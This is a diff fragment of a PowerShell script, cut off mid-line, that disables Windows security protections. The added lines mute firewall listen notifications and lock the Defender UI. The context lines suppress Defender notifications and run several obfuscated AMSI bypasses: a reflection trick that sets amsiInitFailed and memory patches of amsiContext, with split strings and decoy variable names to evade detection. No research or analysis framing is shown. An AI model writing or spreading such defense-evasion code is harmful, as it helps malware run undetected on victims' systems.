@@ -6,6 +6,8 @@ if (-not (Test-Path $regPath)) {
 }
 Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1 2> $null;
+Set-NetFirewallProfile -Profile Domain,Private,Public -NotifyOnListen False;
+Set-MpPreference -UILockdown $true;
 [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('ams'+'iInitFailed','NonPublic,Static').SetValue($null,$true)
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
 $ananas=[Ref].Assembly.GetTypes();Foreach($banana in $ananas) {if ($banana.Name -like "*iU"+"tils") {$cherry=$banana}};$py=$cherry.GetFields('NonPublic,Static');Foreach($ello in $py) {if ($ello.
